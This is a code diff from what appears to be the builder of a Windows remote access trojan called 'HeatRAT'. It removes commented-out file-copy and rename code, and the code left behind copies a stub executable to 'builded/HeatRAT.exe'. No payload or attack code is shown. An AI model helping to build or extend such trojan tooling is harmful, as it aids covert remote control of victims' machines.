@@ -20,94 +20,8 @@
 
 
 
-//void fileCopy(string file, string source, string destination)
-//{
-//	for (int i = 0; i < source.size(); i++)
-//	{
-//		if (source[i] == '\\')
-//			source[i] = '/';
-//	}
-//	for (int i = 0; i < destination.size(); i++)
-//	{
-//		if (destination[i] == '\\')
-//			destination[i] == '/';
-//	}
-//	if (source[source.size() - 1] != '/')
-//		source.push_back('/');
-//	source = source + file;
-//	if (destination[destination.size() - 1] != '/')
-//		destination.push_back('/');
-//	destination = destination + file;
-//	ifstream sourceFile(source.c_str(), ios::binary);
-//	if (sourceFile)
-//	{
-//		ifstream idestination(destination.c_str());
-//		if (idestination)
-//		{
-//			cout << file << " already exist, Do you want to replace? [Yes/No] : ";
-//			string choice;
-//			getline(cin, choice);
-//			if (choice == "Y" || choice == "yes" || choice == "Yes" || choice == "YES" || choice == "y")
-//			{
-//				idestination.close();
-//				ofstream destinationFile(destination.c_str(), ios::binary);
-//				string line;
-//				while (getline(sourceFile, line))
-//				{
-//					destinationFile << line << endl;
-//				}
-//				destinationFile.flush();
-//				destinationFile.close();
-//				cout << endl << "File copied successfully" << endl;
-//			}
-//			else
-//			{
-//				cout << "Exiting...........";
-//				idestination.close();
-//			}
-//		}
-//		else
-//		{
-//			idestination.close();
-//			ofstream destinationFile(destination.c_str(), ios::binary);
-//			string line;
-//			while (getline(sourceFile, line))
-//			{
-//				destinationFile << line << endl;
-//			}
-//			destinationFile.flush();
-//			destinationFile.close();
-//			cout << endl << "File copied successfully" << endl;
-//		}
-//		sourceFile.close();
-//	}
-//	else
-//	{
-//		cout << endl << "[ERROR]:-" << endl;
-//		cout << "Not able to locate " << source << endl;
-//	}
-//}
-
-
-
 void fileCopy(string path, string destination)
 {
-	//for (int i = 0; i < path.size(); i++)
-	//{
-	//	if (path[i] == '\\')
-	//		path[i] = '/';
-	//}
-	//for (int i = 0; i < destination.size(); i++)
-	//{
-	//	if (destination[i] == '\\')
-	//		destination[i] == '/';
-	//}
-	//if (path[path.size() - 1] != '/')
-	//	path.push_back('/');
-	//path = path + file;
-	//if (destination[destination.size() - 1] != '/')
-	//	destination.push_back('/');
-	//destination = destination + file;
 	HANDLE  hConsole;
 	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	FlushConsoleInputBuffer(hConsole);
@@ -277,25 +191,6 @@ void Build()
 		}
 		printf("]\n\n");
 		fileCopy("Modules/stub/Stub.exe", "builded/HeatRAT.exe");
-		/*int result;
-		char newname[] = "builded/HeatRAT.exe";
-		result = rename(stub, newname);
-		if (result == 0)
-		{
-			col = 2;
-			SetConsoleTextAttribute(hConsole, col);
-			printf("done!!!\n");
-			col = 11;
-			SetConsoleTextAttribute(hConsole, col);
-		}
-		else
-		{
-			col = 4;
-			SetConsoleTextAttribute(hConsole, col);
-			printf("ERROR ==> 495");
-			col = 11;
-			SetConsoleTextAttribute(hConsole, col);
-		}*/
 		string version = "2.0.0";
 		string log = "builded\\log.txt";
 
